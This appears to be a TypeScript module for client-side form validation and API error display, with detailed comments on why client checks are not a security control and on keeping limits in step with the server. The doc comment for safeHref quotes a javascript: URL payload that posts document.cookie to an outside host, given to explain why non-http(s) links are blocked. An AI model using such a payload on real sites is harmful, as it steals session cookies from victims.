/**
 * Client-side input validation.
 *
 * ── What this layer is and is not ────────────────────────────────────────────
 *
 * It is NOT a security control. Everything here runs in the user's browser and
 * can be removed with the developer tools open; the authoritative check is the
 * `validate()` middleware on the API, which rejects the same values regardless
 * of what the page did. Nothing on this side may be relied on to keep bad data
 * out of the database.
 *
 * What it IS: immediate, specific feedback. Without it, the way you discover a
 * name is too long is by pressing Save, waiting for a round trip, and getting a
 * toast — after which the form still holds a value you cannot submit. Catching
 * it at the keystroke turns a failed request into a message under the field.
 *
 * ── Keeping the two sides in step ────────────────────────────────────────────
 *
 * The limits below are deliberately written as a single exported table that
 * mirrors `artifacts/api-server/src/lib/validation.ts`. Two copies of a rule
 * will eventually disagree; the failure mode is chosen so that when they do,
 * the CLIENT is the stricter one — a value the browser accepts but the server
 * rejects is a confusing error, while a value the browser rejects and the
 * server would have accepted is merely a slightly tight form.
 */

/** Field length ceilings. Must not exceed the server's own limits. */
export const LIMITS = {
  name: 200,
  identifier: 128,
  description: 2000,
  username: 64,
  email: 320,
  url: 2048,
  shortText: 200,
  longText: 10_000,
} as const;

/**
 * Control characters and invisible/bidirectional marks.
 *
 * Same set the server rejects. The bidirectional ones matter here in particular:
 * they let a value render in one order while being stored in another, so a name
 * an operator reads as safe is not the name that was saved.
 */
const CONTROL_CHARS = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x9F]/;
const BIDI_AND_INVISIBLE = /[\u200B-\u200F\u2028-\u202E\u2060-\u2064\u2066-\u206F\uFEFF]/;

/** Device identifiers are matched against telemetry exactly — keep the set narrow. */
const IDENTIFIER_PATTERN = /^[A-Za-z0-9._:/-]+$/;
const USERNAME_PATTERN = /^[A-Za-z0-9._-]+$/;

/** `null` means valid; a string is the message to show under the field. */
export type FieldIssue = string | null;

function commonIssues(value: string, label: string, max: number, required: boolean): FieldIssue {
  const trimmed = value.trim();
  if (required && trimmed.length === 0) return `${label} is required.`;
  if (trimmed.length > max) return `${label} must be ${max} characters or fewer.`;
  if (CONTROL_CHARS.test(trimmed)) return `${label} contains characters that are not allowed.`;
  if (BIDI_AND_INVISIBLE.test(trimmed)) {
    return `${label} contains hidden or right-to-left characters. Please retype it.`;
  }
  return null;
}

export function validateName(value: string, label = "Name"): FieldIssue {
  return commonIssues(value, label, LIMITS.name, true);
}

export function validateDescription(value: string, label = "Description"): FieldIssue {
  return commonIssues(value, label, LIMITS.description, false);
}

export function validateIdentifier(value: string, label = "Identifier"): FieldIssue {
  const base = commonIssues(value, label, LIMITS.identifier, true);
  if (base) return base;
  if (!IDENTIFIER_PATTERN.test(value.trim())) {
    return `${label} may contain only letters, digits and . _ : / -`;
  }
  return null;
}

export function validateUsername(value: string, label = "Username"): FieldIssue {
  const base = commonIssues(value, label, LIMITS.username, true);
  if (base) return base;
  const t = value.trim();
  if (t.length < 2) return `${label} must be at least 2 characters.`;
  if (!USERNAME_PATTERN.test(t)) return `${label} may contain only letters, digits and . _ -`;
  return null;
}

export function validateEmail(value: string, label = "Email"): FieldIssue {
  const base = commonIssues(value, label, LIMITS.email, true);
  if (base) return base;
  // Deliberately loose. Email syntax is far more permissive than the regexes
  // people write for it, and a form that refuses a valid address is a worse
  // failure than one that lets a typo through to the server.
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim())) return `${label} does not look like a valid address.`;
  return null;
}

/**
 * An http(s) URL.
 *
 * Scheme is an allow-list of two, which is what rejects `javascript:` and
 * `data:`. Whether the HOST is one the server may call is decided server-side
 * (the SSRF guard) — the browser cannot answer that question and should not
 * pretend to.
 */
export function validateUrl(value: string, label = "URL", required = true): FieldIssue {
  const t = value.trim();
  if (!t) return required ? `${label} is required.` : null;
  if (t.length > LIMITS.url) return `${label} must be ${LIMITS.url} characters or fewer.`;
  let parsed: URL;
  try {
    parsed = new URL(t);
  } catch {
    return `${label} must be a complete URL, including https://`;
  }
  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
    return `${label} must start with http:// or https://`;
  }
  return null;
}

// ── Rendering-side helpers ───────────────────────────────────────────────────

/**
 * Make a URL safe to place in an `href`.
 *
 * React escapes text content, so `{userValue}` cannot inject markup — but it
 * does NOT sanitise URL attributes. `<a href={value}>` with a value of
 * `javascript:fetch('https://…',{method:'POST',body:document.cookie})` executes
 * on click, in the victim's session. Returning `undefined` for anything that is
 * not http(s) renders an anchor that simply does nothing.
 *
 * Use this for any URL that came from the database or from a user, however
 * indirectly.
 */
export function safeHref(value: string | null | undefined): string | undefined {
  if (!value) return undefined;
  try {
    const parsed = new URL(value, window.location.origin);
    return parsed.protocol === "http:" || parsed.protocol === "https:" ? parsed.href : undefined;
  } catch {
    return undefined;
  }
}

/**
 * Trim a value to a field's ceiling as it is typed.
 *
 * Paired with `maxLength` on the input, this covers the paste case: `maxLength`
 * is enforced by the browser on typing and on paste, but not on a programmatic
 * value change, so a controlled component still wants the guard.
 */
export function clampToLimit(value: string, max: number): string {
  return value.length > max ? value.slice(0, max) : value;
}

// ── Server error mapping ─────────────────────────────────────────────────────

export interface ServerFieldError {
  field: string;
  message: string;
}

interface ValidationErrorBody {
  error?: string;
  code?: string;
  errors?: ServerFieldError[];
}

/**
 * Turn the API's 400 into a per-field map the form can render.
 *
 * The server returns `{ code, errors: [{ field, message }] }` from the shared
 * validation middleware, so every form gets field-level messages — including
 * forms that do no client-side checking of their own. That is the part of this
 * module that genuinely covers "all inputs": the client rules below are a
 * convenience on the fields they cover, but this path reports precisely what
 * was wrong for every endpoint, whether or not anyone wrote a client rule.
 *
 * Returns `null` when the response was not a validation failure, so callers can
 * fall through to their existing error handling.
 */
export async function readFieldErrors(res: Response): Promise<Record<string, string> | null> {
  if (res.status !== 400) return null;
  let body: ValidationErrorBody;
  try {
    body = (await res.clone().json()) as ValidationErrorBody;
  } catch {
    return null;
  }
  if (!Array.isArray(body.errors) || body.errors.length === 0) return null;

  const map: Record<string, string> = {};
  for (const e of body.errors) {
    if (typeof e?.field === "string" && typeof e?.message === "string" && !(e.field in map)) {
      map[e.field] = e.message;
    }
  }
  return Object.keys(map).length > 0 ? map : null;
}

/**
 * Turn any failed response into a message safe to show, plus the server's
 * correlation id.
 *
 * The API deliberately returns a generic sentence for anything unexpected — no
 * stack, no database detail — and a `correlationId` that matches the log entry
 * holding the real cause. Showing that reference is the whole point of the
 * scheme: without it a user can only report "it failed", and nobody can find
 * which of the day's log lines was theirs.
 *
 * Falls back to the status code when the body is not JSON, which happens when a
 * proxy (not the API) generates the error — a 502 from nginx has no body of ours.
 */
export interface ApiErrorInfo {
  message: string;
  correlationId: string | null;
  status: number;
  /** Field-level detail when the failure was validation. */
  fields: Record<string, string> | null;
}

export async function describeApiError(res: Response): Promise<ApiErrorInfo> {
  let body: { error?: string; correlationId?: string; errors?: ServerFieldError[] } = {};
  try {
    body = (await res.clone().json()) as typeof body;
  } catch {
    /* not JSON — fall through to the status-based message */
  }

  const fields = Array.isArray(body.errors) && body.errors.length > 0
    ? Object.fromEntries(
        body.errors
          .filter((e) => typeof e?.field === "string" && typeof e?.message === "string")
          .map((e) => [e.field, e.message]),
      )
    : null;

  return {
    message: body.error ?? `The request failed (${res.status}).`,
    // Read from the header too: a response with no body at all still carries it.
    correlationId: body.correlationId ?? res.headers.get("X-Correlation-Id"),
    status: res.status,
    fields,
  };
}

/** Message plus reference, ready for a toast. */
export function formatApiError(info: ApiErrorInfo): string {
  const base = info.fields ? summariseFieldErrors(info.fields) : info.message;
  return info.correlationId ? `${base} (reference ${info.correlationId})` : base;
}

/** One-line summary of a validation failure, for a toast. */
export function summariseFieldErrors(errors: Record<string, string>): string {
  const entries = Object.entries(errors);
  if (entries.length === 1) {
    const [field, message] = entries[0];
    return field === "(root)" || field === "(body)" ? message : `${field}: ${message}`;
  }
  return entries.slice(0, 3).map(([f, m]) => `${f}: ${m}`).join("; ")
    + (entries.length > 3 ? ` (+${entries.length - 3} more)` : "");
}
